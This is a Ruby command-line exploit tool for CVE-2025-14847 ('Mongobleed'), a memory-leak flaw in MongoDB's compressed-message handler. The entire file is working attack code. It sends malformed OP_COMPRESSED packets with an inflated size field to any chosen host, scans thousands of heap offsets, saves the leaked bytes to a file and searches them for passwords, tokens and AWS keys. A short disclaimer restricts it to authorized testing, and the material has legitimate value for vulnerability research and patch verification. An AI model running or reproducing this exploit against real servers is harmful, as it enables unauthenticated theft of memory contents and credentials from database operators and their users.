#!/usr/bin/env ruby
# typed: strict
# frozen_string_literal: true

# ==============================================================================
# Mongobleed: CVE-2025-14847 Exploit Implementation
# ==============================================================================
#
# Classification
#   CVE:              CVE-2025-14847
#   Type:             Heap Buffer Over-read
#   Severity:         High
#   Attack Vector:    Network, Unauthenticated
#   Component:        MongoDB OP_COMPRESSED Handler
#
# Vulnerability
#   MongoDB's OP_COMPRESSED message handler (opcode 2012) fails to validate the
#   uncompressed_size field against actual decompressed payload length. When a
#   client provides an inflated uncompressed_size value, the BSON parser reads
#   beyond the message boundary into heap memory. Error messages generated from
#   malformed heap data leak memory contents as field names and type codes.
#
# Attack Flow
#   1. Construct BSON document with controlled length field
#   2. Wrap in OP_MSG and compress with zlib
#   3. Wrap in OP_COMPRESSED with inflated uncompressed_size (actual + 500 bytes)
#   4. Server decompresses into buffer, parser reads uncompressed_size bytes
#   5. Parser hits invalid heap data, generates errors containing leaked memory
#   6. Extract leaked data from error patterns: "field name 'X'" and "type N"
#
# Implementation
#   Iterates through document lengths (min_offset to max_offset), each probing
#   different heap offsets. Maintains 500-byte overflow to trigger over-read.
#   Deduplicates results for display, preserves all bytes for analysis.
#
# Disclaimer
#   For authorized security testing and research only. Users are responsible
#   for obtaining proper authorization before use.
#
# Author
#   Demetrius Ford (github.com/demetriusford)
#   Based on research by Joe Desimone
# ==============================================================================

require "socket"
require "zlib"
require "optparse"
require "set"
require "colorize"
require "sorbet-runtime"

module CVE202514847
  extend T::Sig

  class Error < StandardError; end
  class NetworkError < Error; end
  class DecompressionError < Error; end

  # MongoDB's OP_COMPRESSED supports snappy, zlib, and zstd.
  # Zlib (compressor_id=2) is used for universal compatibility.
  class Compressor
    extend T::Sig

    sig { params(data: String).returns(String) }
    def compress(data)
      Zlib::Deflate.deflate(data)
    end
  end

  # Varying doc_len probes different heap offsets when combined with inflated buffer_size.
  class BSONBuilder
    extend T::Sig

    # Minimal valid BSON: type=0x10 (int32), field='a', null, value=1
    BSON_CONTENT = T.let("\x10a\x00\x01\x00\x00\x00", String)

    sig { params(doc_len: Integer).returns(String) }
    def build(doc_len)
      [doc_len].pack("l<") + BSON_CONTENT.b
    end
  end

  class WireProtocolBuilder
    extend T::Sig

    # OP_MSG format: flags (4 bytes) + kind (1 byte) + payload
    sig { params(bson: String).returns(String) }
    def build_op_msg(bson)
      [0].pack("L<") + "\x00".b + bson
    end

    # OP_COMPRESSED format: original_opcode (2013=OP_MSG) + uncompressed_size + compressor_id (2=zlib) + data
    # The vulnerability: buffer_size (uncompressed_size) is trusted without validation,
    # causing BSON parser to read beyond actual decompressed data into heap memory.
    sig { params(compressed_data: String, buffer_size: Integer).returns(String) }
    def build_op_compressed(compressed_data:, buffer_size:)
      [2013].pack("L<") +
        [buffer_size].pack("l<") +
        [2].pack("C") +
        compressed_data
    end
  end

  class HeaderBuilder
    extend T::Sig

    HEADER_SIZE = T.let(16, Integer)
    OPCODE_COMPRESSED = T.let(2012, Integer)

    # Wire protocol header: length + requestID + responseID + opcode
    sig { params(payload_size: Integer).returns(String) }
    def build(payload_size)
      [HEADER_SIZE + payload_size, 1, 0, OPCODE_COMPRESSED].pack("L<L<L<L<")
    end
  end

  # Construction order: BSON → OP_MSG → compress → OP_COMPRESSED → header
  class PayloadBuilder
    extend T::Sig

    sig do
      params(
        bson_builder: BSONBuilder,
        protocol_builder: WireProtocolBuilder,
        compressor: Compressor,
        header_builder: HeaderBuilder,
      ).void
    end
    def initialize(
      bson_builder:,
      protocol_builder:,
      compressor:,
      header_builder:
    )
      @bson_builder = bson_builder
      @protocol_builder = protocol_builder
      @compressor = compressor
      @header_builder = header_builder
    end

    sig { params(doc_len: Integer, buffer_size: Integer).returns(String) }
    def build(doc_len:, buffer_size:)
      bson = @bson_builder.build(doc_len)
      op_msg = @protocol_builder.build_op_msg(bson)
      compressed = @compressor.compress(op_msg)
      op_compressed = @protocol_builder.build_op_compressed(
        compressed_data: compressed,
        buffer_size: buffer_size,
      )
      @header_builder.build(op_compressed.bytesize) + op_compressed
    end
  end

  class SocketFactory
    extend T::Sig

    SOCKET_TIMEOUT = T.let(2, Integer)

    sig { params(host: String, port: Integer).returns(Socket) }
    def create(host:, port:)
      Socket.new(:INET, :STREAM).tap do |sock|
        sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [SOCKET_TIMEOUT, 0].pack("l_2"))
        sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_SNDTIMEO, [SOCKET_TIMEOUT, 0].pack("l_2"))
        sock.connect(Socket.sockaddr_in(port, host))
      end
    end
  end

  # MongoDB uses length-prefixed framing: first 4 bytes specify total message length.
  class SocketReader
    extend T::Sig

    RECV_BUFFER_SIZE = T.let(4096, Integer)

    sig { params(socket: Socket).returns(String) }
    def read(socket)
      response = String.new(encoding: Encoding::BINARY)

      loop do
        break if response_complete?(response)

        chunk = socket.recv(RECV_BUFFER_SIZE)
        break if chunk.empty?

        response << chunk
      end

      response
    end

    private

    sig { params(response: String).returns(T::Boolean) }
    def response_complete?(response)
      return false if response.bytesize < 4

      expected_length = response[0..3].unpack1("L<")
      response.bytesize >= expected_length
    end
  end

  class NetworkClient
    extend T::Sig

    sig { returns(String) }
    attr_reader :host

    sig { returns(Integer) }
    attr_reader :port

    sig { params(host: String, port: Integer, socket_factory: SocketFactory, socket_reader: SocketReader).void }
    def initialize(host:, port:, socket_factory:, socket_reader:)
      @host = host
      @port = port
      @socket_factory = socket_factory
      @socket_reader = socket_reader
    end

    sig { params(payload: String).returns(String) }
    def send_and_receive(payload)
      socket = @socket_factory.create(host: host, port: port)
      socket.write(payload)
      response = @socket_reader.read(socket)
      socket.close
      response
    rescue SocketError, Errno::ECONNREFUSED, Errno::ETIMEDOUT => e
      raise NetworkError, "Failed to connect to #{host}:#{port} - #{e.message}"
    rescue IOError, SystemCallError
      # Return empty response if read/write operations fail
      String.new(encoding: Encoding::BINARY)
    end
  end

  # Leaked data surfaces in BSON parsing error messages after decompression.
  class ResponseDecompressor
    extend T::Sig

    MIN_RESPONSE_SIZE = T.let(25, Integer) # 16-byte header + 9-byte OP_COMPRESSED envelope minimum
    OPCODE_COMPRESSED = T.let(2012, Integer)

    sig { params(response: String).void }
    def initialize(response)
      @response = response
    end

    sig { returns(T.nilable(String)) }
    def decompress
      return if @response.bytesize < MIN_RESPONSE_SIZE

      msg_len = @response[0..3].unpack1("L<")

      if compressed?
        # Skip 16-byte header + 9-byte OP_COMPRESSED envelope
        Zlib::Inflate.inflate(@response[25...msg_len])
      else
        @response[16...msg_len]
      end
    rescue Zlib::Error => e
      raise DecompressionError, "Failed to decompress response: #{e.message}"
    end

    private

    sig { returns(T::Boolean) }
    def compressed?
      @response[12..15].unpack1("L<") == OPCODE_COMPRESSED
    end
  end

  # When BSON parser reads beyond the buffer into heap memory, it generates errors
  # containing "field name 'X'" and "type N" where X and N are leaked heap data.
  class LeakParser
    extend T::Sig

    FIELD_NAME_PATTERN = T.let(/field name '([^']*)'/, Regexp)
    TYPE_PATTERN = T.let(/type (\d+)/, Regexp)
    IGNORED_FIELDS = T.let(["?", "a", "$db", "ping"].freeze, T::Array[String]) # Filter out our probe payload

    sig { params(raw_data: T.nilable(String)).void }
    def initialize(raw_data)
      @raw_data = raw_data
    end

    sig { returns(T::Array[String]) }
    def parse
      return [] if @raw_data.nil?

      extract_field_names + extract_type_bytes
    end

    private

    sig { returns(T::Array[String]) }
    def extract_field_names
      T.must(@raw_data).scan(FIELD_NAME_PATTERN).flatten.reject do |data|
        data.empty? || IGNORED_FIELDS.include?(data)
      end
    end

    sig { returns(T::Array[String]) }
    def extract_type_bytes
      T.must(@raw_data).scan(TYPE_PATTERN).map do |match|
        [match.first.to_i & 0xFF].pack("C")
      end
    end
  end

  class ScanResults
    extend T::Sig

    sig { returns(String) }
    attr_reader :all_leaked

    sig { returns(T::Set[String]) }
    attr_reader :unique_leaks

    sig { void }
    def initialize
      @all_leaked = T.let(String.new(encoding: Encoding::BINARY), String)
      @unique_leaks = T.let(Set.new, T::Set[String])
    end

    sig { params(data: String).void }
    def add(data)
      unique_leaks.add(data)
      all_leaked << data
    end

    sig { params(data: String).returns(T::Boolean) }
    def seen?(data)
      unique_leaks.include?(data)
    end

    sig { returns(Integer) }
    def total_bytes
      all_leaked.bytesize
    end

    sig { returns(Integer) }
    def unique_count
      unique_leaks.size
    end
  end

  class OutputFormatter
    extend T::Sig

    MIN_DISPLAY_SIZE = T.let(10, Integer)
    PREVIEW_LENGTH = T.let(80, Integer)

    sig { void }
    def print_banner
      puts
      puts ("=" * 60).cyan
      puts "  Mongobleed - CVE-2025-14847 MongoDB Memory Leak".bold
      puts "  Author: Demetrius Ford - github.com/demetriusford".light_black
      puts ("=" * 60).cyan
      puts
    end

    sig { params(host: String, port: Integer, min_offset: Integer, max_offset: Integer).void }
    def print_header(host:, port:, min_offset:, max_offset:)
      print_banner
      puts "#{"[*]".blue} Target: #{"#{host}:#{port}".bold}"
      puts "#{"[*]".blue} Offset range: #{min_offset.to_s.bold} to #{max_offset.to_s.bold}"
      puts "#{"[*]".blue} Starting memory scan..."
      puts
    end

    sig { params(data: String, offset: Integer).void }
    def print_leak(data:, offset:)
      return if data.bytesize <= MIN_DISPLAY_SIZE

      preview = data[0...PREVIEW_LENGTH]
        .force_encoding(Encoding::UTF_8)
        .scrub("?")

      offset_str = format("%04d", offset).cyan
      size_str = format("%4d bytes", data.bytesize).magenta
      puts "#{"[+]".green} Offset #{offset_str} | Size: #{size_str} | #{preview}"
    end

    sig { params(total_bytes: Integer, unique_count: Integer, output_path: String).void }
    def print_summary(total_bytes:, unique_count:, output_path:)
      puts
      puts ("=" * 60).cyan
      puts "#{"[*]".blue} Scan complete!"
      puts
      puts "#{"[*]".blue} Total leaked data: #{"#{total_bytes} bytes".green}"
      puts "#{"[*]".blue} Unique fragments: #{unique_count.to_s.green}"
      puts "#{"[*]".blue} Output saved to: #{output_path.bold}"
    end

    sig { params(pattern: String).void }
    def print_secret_found(pattern)
      puts "#{"[!]".yellow} Potential secret detected: #{pattern.upcase.red}"
    end

    sig { void }
    def print_secrets_header
      puts
      puts ("-" * 60).yellow
      puts "#{"[!]".yellow} Scanning for sensitive patterns..."
      puts ("-" * 60).yellow
    end

    sig { void }
    def print_no_secrets
      puts "#{"[*]".blue} No obvious secrets detected in leaked data"
    end

    sig { void }
    def print_secrets_footer
      puts ("-" * 60).yellow
    end
  end

  class FileWriter
    extend T::Sig

    sig { params(path: String, data: String).void }
    def write(path:, data:)
      File.binwrite(path, data)
    end
  end

  class SecretDetector
    extend T::Sig

    SECRET_PATTERNS = T.let(["password", "secret", "key", "token", "admin", "AKIA"].freeze, T::Array[String]) # AKIA = AWS access keys

    sig { params(data: String).void }
    def initialize(data)
      @data = data
    end

    sig { returns(T::Array[String]) }
    def detect
      downcase_data = @data.downcase

      SECRET_PATTERNS.select do |pattern|
        downcase_data.include?(pattern.downcase)
      end
    end
  end

  class MemoryProbe
    extend T::Sig

    sig { params(network_client: NetworkClient, payload_builder: PayloadBuilder).void }
    def initialize(network_client:, payload_builder:)
      @network_client = network_client
      @payload_builder = payload_builder
    end

    sig { params(doc_len: Integer, buffer_size: Integer).returns(String) }
    def send_probe(doc_len:, buffer_size:)
      payload = @payload_builder.build(doc_len: doc_len, buffer_size: buffer_size)
      @network_client.send_and_receive(payload)
    end
  end

  class LeakExtractor
    extend T::Sig

    sig { params(decompressor: T.class_of(ResponseDecompressor), parser: T.class_of(LeakParser)).void }
    def initialize(decompressor:, parser:)
      @decompressor = decompressor
      @parser = parser
    end

    sig { params(response: String).returns(T::Array[String]) }
    def extract(response)
      raw_data = @decompressor.new(response).decompress
      @parser.new(raw_data).parse
    rescue DecompressionError, Zlib::Error, Encoding::InvalidByteSequenceError
      # Return empty array if decompression or parsing fails
      []
    end
  end

  # Each doc_len probes a different heap offset. The 500-byte overflow causes
  # BSON parser to read beyond the actual decompressed data into heap memory.
  class OffsetScanner
    extend T::Sig

    BUFFER_SIZE_OFFSET = T.let(500, Integer) # Claim buffer is 500 bytes larger than actual

    sig { params(min_offset: Integer, max_offset: Integer, memory_probe: MemoryProbe, leak_extractor: LeakExtractor).void }
    def initialize(min_offset:, max_offset:, memory_probe:, leak_extractor:)
      @min_offset = min_offset
      @max_offset = max_offset
      @memory_probe = memory_probe
      @leak_extractor = leak_extractor
    end

    sig { params(_blk: T.proc.params(leak_data: String, offset: Integer).void).void }
    def each_leak(&_blk)
      (@min_offset...@max_offset).each do |doc_len|
        response = @memory_probe.send_probe(
          doc_len: doc_len,
          buffer_size: doc_len + BUFFER_SIZE_OFFSET,
        )
        leaks = @leak_extractor.extract(response)

        leaks.each do |leak_data|
          yield leak_data, doc_len
        end
      end
    end
  end

  class ExploitRunner
    extend T::Sig

    sig do
      params(
        offset_scanner: OffsetScanner,
        results: ScanResults,
        output_formatter: OutputFormatter,
        file_writer: FileWriter,
        secret_detector_class: T.class_of(SecretDetector),
        output_path: String,
      ).void
    end
    def initialize(
      offset_scanner:,
      results:,
      output_formatter:,
      file_writer:,
      secret_detector_class:,
      output_path:
    )
      @offset_scanner = offset_scanner
      @results = results
      @output_formatter = output_formatter
      @file_writer = file_writer
      @secret_detector_class = secret_detector_class
      @output_path = output_path
    end

    sig { void }
    def execute
      collect_leaks
      save_results
      print_summary
      detect_and_print_secrets
    end

    private

    sig { void }
    def collect_leaks
      @offset_scanner.each_leak do |leak_data, offset|
        next if @results.seen?(leak_data)

        @results.add(leak_data)
        @output_formatter.print_leak(data: leak_data, offset: offset)
      end
    end

    sig { void }
    def save_results
      @file_writer.write(path: @output_path, data: @results.all_leaked)
    end

    sig { void }
    def print_summary
      @output_formatter.print_summary(
        total_bytes: @results.total_bytes,
        unique_count: @results.unique_count,
        output_path: @output_path,
      )
    end

    sig { void }
    def detect_and_print_secrets
      detector = @secret_detector_class.new(@results.all_leaked)
      detected_secrets = detector.detect

      if detected_secrets.any?
        @output_formatter.print_secrets_header
        detected_secrets.each do |pattern|
          @output_formatter.print_secret_found(pattern)
        end
        @output_formatter.print_secrets_footer
      else
        @output_formatter.print_no_secrets
      end
    end
  end

  class OptionsParser
    extend T::Sig

    OptionsHash = T.type_alias { T::Hash[Symbol, T.any(String, Integer)] }

    DEFAULT_OPTIONS = T.let(
      {
        host: "localhost",
        port: 27017,
        min_offset: 20,
        max_offset: 8192,
        output: "leaked.bin",
      }.freeze,
      T::Hash[Symbol, T.any(String, Integer)],
    )

    sig { params(args: T::Array[String]).returns(OptionsHash) }
    def parse(args = ARGV)
      options = DEFAULT_OPTIONS.dup

      OptionParser.new do |opts|
        opts.banner = "Usage: #{$PROGRAM_NAME} [options]"

        opts.on("--host HOST", "Target host (default: localhost)") do |v|
          options[:host] = v
        end

        opts.on("--port PORT", Integer, "Target port (default: 27017)") do |v|
          options[:port] = v
        end

        opts.on("--min-offset MIN", Integer, "Min doc length (default: 20)") do |v|
          options[:min_offset] = v
        end

        opts.on("--max-offset MAX", Integer, "Max doc length (default: 8192)") do |v|
          options[:max_offset] = v
        end

        opts.on("--output FILE", "Output file (default: leaked.bin)") do |v|
          options[:output] = v
        end

        opts.on("-h", "--help", "Show this help") do
          puts opts
          exit
        end
      end.parse!(args)

      options
    end
  end

  class Scanner
    extend T::Sig

    sig { params(options: OptionsParser::OptionsHash).void }
    def initialize(options)
      @options = options
      @output_formatter = T.let(OutputFormatter.new, OutputFormatter)
    end

    sig { void }
    def run
      print_header
      workflow = build_workflow
      workflow.execute
    rescue Error => e
      warn("#{"[-]".red} Error: #{e.message}")
      exit(1)
    end

    private

    sig { void }
    def print_header
      @output_formatter.print_header(
        host: T.cast(@options[:host], String),
        port: T.cast(@options[:port], Integer),
        min_offset: T.cast(@options[:min_offset], Integer),
        max_offset: T.cast(@options[:max_offset], Integer),
      )
    end

    sig { returns(ExploitRunner) }
    def build_workflow
      ExploitRunner.new(
        offset_scanner: build_offset_scanner,
        results: ScanResults.new,
        output_formatter: @output_formatter,
        file_writer: FileWriter.new,
        secret_detector_class: SecretDetector,
        output_path: T.cast(@options[:output], String),
      )
    end

    sig { returns(OffsetScanner) }
    def build_offset_scanner
      OffsetScanner.new(
        min_offset: T.cast(@options[:min_offset], Integer),
        max_offset: T.cast(@options[:max_offset], Integer),
        memory_probe: build_memory_probe,
        leak_extractor: build_leak_extractor,
      )
    end

    sig { returns(MemoryProbe) }
    def build_memory_probe
      MemoryProbe.new(
        network_client: build_network_client,
        payload_builder: build_payload_builder,
      )
    end

    sig { returns(NetworkClient) }
    def build_network_client
      NetworkClient.new(
        host: T.cast(@options[:host], String),
        port: T.cast(@options[:port], Integer),
        socket_factory: SocketFactory.new,
        socket_reader: SocketReader.new,
      )
    end

    sig { returns(PayloadBuilder) }
    def build_payload_builder
      PayloadBuilder.new(
        bson_builder: BSONBuilder.new,
        protocol_builder: WireProtocolBuilder.new,
        compressor: Compressor.new,
        header_builder: HeaderBuilder.new,
      )
    end

    sig { returns(LeakExtractor) }
    def build_leak_extractor
      LeakExtractor.new(
        decompressor: ResponseDecompressor,
        parser: LeakParser,
      )
    end
  end

  class CLI
    extend T::Sig

    class << self
      extend T::Sig

      sig { void }
      def run
        new.run
      end
    end

    sig { void }
    def run
      options = OptionsParser.new.parse
      Scanner.new(options).run
    end
  end
end

CVE202514847::CLI.run if __FILE__ == $PROGRAM_NAME
